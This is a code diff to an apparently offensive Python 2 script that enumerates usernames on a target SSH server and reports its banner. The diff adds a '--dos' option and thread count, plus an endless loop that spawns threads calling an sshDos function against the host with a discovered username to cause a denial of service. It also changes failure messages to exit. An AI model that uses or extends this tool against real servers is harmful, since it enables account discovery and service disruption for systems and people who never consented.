@@ -42,9 +42,11 @@ def main():
 	parse.add_argument('-H', action='store', dest='host', help='Host to attack')
 	parse.add_argument('-p', action='store', dest='port', help='Host port')
 	parse.add_argument('-L', action='store', dest='ufile', help='Username list file')
-	parse.add_argument('-U', action='store', dest='user', help='Username')
+	parse.add_argument('-U', action='store', dest='user', help='Only use a single username')
 	parse.add_argument('-d', action='store', dest='delay', help='Time delay in seconds')
-	parse.add_argument('-v', action='store', dest='vari',default = 'yes', help='Make variations of the user name (default yes)')
+	parse.add_argument('-v', action='store', dest='vari',default = 'yes', help='Make variations of the username (default yes)')
+	parse.add_argument('--dos', action='store', dest='dos',default = 'no', help='Try to make a DOS attack (default no)')
+	parse.add_argument('-t', action='store', dest='threads',default = '5', help='Threads for the DOS attack (default 5)')
 
 	argus=parse.parse_args()
 
@@ -68,6 +70,8 @@ def main():
 		port = argus.port
  		defTime = int(argus.delay)
  		vari = argus.vari
+		dos = argus.dos
+		threads = int(argus.threads)
  		try:
  			IP(host)
  		except ValueError:
@@ -93,7 +97,8 @@ def main():
 					foundUser.append(fUser)
 				sock.close()
 			if len(foundUser) == 0:
-				print "No users found. " + banner + " perhaps it's not vulnerable."
+				print "No users found." 
+				exit(1)
 			else:	 
 				print
 				print "Server version: " + banner
@@ -102,6 +107,7 @@ def main():
 				print "--------------------------------------"
 				for entry in foundUser:
 					if entry != -1:
+						userfdos = entry[0]
 						print entry[0] + "                      " + str(entry[3])
 		else: 
          
@@ -120,7 +126,8 @@ def main():
 						foundUser.append(fUser)
 					sock.close()
 				if len(foundUser) == 0:
-					print "No users found. " + banner + " perhaps it's not vulnerable."
+					print "No users found. " 
+					exit(1)
 
 				else:	 
 					print
@@ -130,6 +137,7 @@ def main():
 					print "--------------------------------------"
 					for entry in foundUser:
 						if entry != -1:
+							userfdos = entry[0]
 							print entry[0] + "                      " + str(entry[3])
 			if vari == 'no':
 				print
@@ -143,7 +151,8 @@ def main():
 					foundUser.append(fUser)
 				sock.close()
 				if len(foundUser) == 0:
-					print "No users " + user + "found. " + banner + " perhaps it's not vulnerable."
+					print "No user " + user + " found." 
+					exit(1)
 				else:	 
 					print
 					print "Server version: " + banner
@@ -152,5 +161,16 @@ def main():
 					print "--------------------------------------"
 					for entry in foundUser:
 						if entry != -1:
+							userfdos = entry[0]
 							print entry[0] + "                      " + str(entry[3])
+		if dos == 'yes':
+			print 
+			print "Trying to establish a DOS condition with user " + userfdos + " and " + str(threads) +  " threads..."
+			print "If you see some error message probably the attack has succeeded. Press [Ctrl-Z] to stop."
+
+			while 1 : 
+		        	for att in range(threads):
+					sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+					t = Thread(target=sshDos, args=(host, port, userfdos, sock, defTime))
+			      		t.start()
 
